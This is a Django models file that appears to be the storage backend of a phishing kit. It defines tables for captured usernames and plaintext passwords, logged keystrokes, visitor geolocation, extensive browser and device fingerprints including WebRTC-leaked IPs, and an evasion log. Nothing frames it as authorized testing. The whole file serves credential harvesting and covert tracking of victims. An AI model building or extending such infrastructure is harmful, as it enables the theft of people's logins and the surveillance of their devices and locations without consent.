from django.db import models
from django.db.models import JSONField

class PhishingLog(models.Model):
    page = models.CharField(max_length=100)
    username = models.CharField(max_length=255, null=True, blank=True)
    password = models.CharField(max_length=255, null=True, blank=True)
    ip_address = models.GenericIPAddressField()
    user_agent = models.TextField(null=True, blank=True)
    timestamp = models.DateTimeField(auto_now_add=True)
    additional_data = JSONField(null=True, blank=True)
    
    def __str__(self):
        return f"{self.page} - {self.username} - {self.timestamp}"

class KeystrokeLog(models.Model):
    page = models.CharField(max_length=255)
    keys = models.TextField()
    ip = models.GenericIPAddressField()
    timestamp = models.DateTimeField(auto_now_add=True)

class GeoLog(models.Model):
    lat = models.CharField(max_length=50)
    lon = models.CharField(max_length=50)
    ip = models.GenericIPAddressField()
    timestamp = models.DateTimeField(auto_now_add=True)

class FingerprintLog(models.Model):
    # Basic connection info
    ip_address = models.GenericIPAddressField()
    user_agent = models.TextField(null=True, blank=True)
    timestamp = models.DateTimeField(auto_now_add=True)
    
    # Device characteristics
    device_type = models.CharField(max_length=20, null=True, blank=True)
    platform = models.CharField(max_length=100, null=True, blank=True)
    languages = models.TextField(null=True, blank=True)  # JSON array
    
    # Screen info
    screen_resolution = models.CharField(max_length=20, null=True, blank=True)
    color_depth = models.IntegerField(null=True, blank=True)
    pixel_ratio = models.FloatField(null=True, blank=True)
    orientation = models.CharField(max_length=50, null=True, blank=True)
    
    # Hardware
    hardware_concurrency = models.IntegerField(null=True, blank=True)
    device_memory = models.FloatField(null=True, blank=True)
    cpu_class = models.CharField(max_length=100, null=True, blank=True)
    
    # Browser characteristics
    timezone = models.CharField(max_length=100, null=True, blank=True)
    do_not_track = models.BooleanField(null=True)
    cookie_enabled = models.BooleanField(null=True)
    pdf_viewer_enabled = models.BooleanField(null=True)
    
    # Fingerprints
    canvas_hash = models.TextField(null=True, blank=True)
    webgl_vendor = models.TextField(null=True, blank=True)
    webgl_renderer = models.TextField(null=True, blank=True)
    audio_hash = models.TextField(null=True, blank=True)
    
    # Plugins and fonts
    plugins = models.TextField(null=True, blank=True)  # JSON array
    fonts = models.TextField(null=True, blank=True)   # JSON array
    
    # Network info
    connection_type = models.CharField(max_length=50, null=True, blank=True, default='unknown')
    effective_connection = models.CharField(max_length=50, null=True, blank=True)
    downlink = models.FloatField(null=True, blank=True, default=0)
    rtt = models.IntegerField(null=True, blank=True, default=0)
    
    # WebRTC info
    webrtc_ips = models.TextField(null=True, blank=True)  # JSON array
    
    # Raw data backup
    raw_data = models.JSONField(null=True, blank=True)
    
    class Meta:
        ordering = ['-timestamp']
        verbose_name = 'Fingerprint Log'
        verbose_name_plural = 'Fingerprint Logs'
    
    def __str__(self):
        return f"{self.ip_address} - {self.device_type or 'Unknown'} - {self.timestamp}"
    
    def get_webgl_info(self):
        return {
            'vendor': self.webgl_vendor,
            'renderer': self.webgl_renderer
        }
    
    def get_connection_info(self):
        return {
            'type': self.connection_type,
            'effective_type': self.effective_connection,
            'downlink': self.downlink,
            'rtt': self.rtt
        }


class EvasionLog(models.Model):
    info = models.TextField()
    ip = models.GenericIPAddressField()
    timestamp = models.DateTimeField(auto_now_add=True)
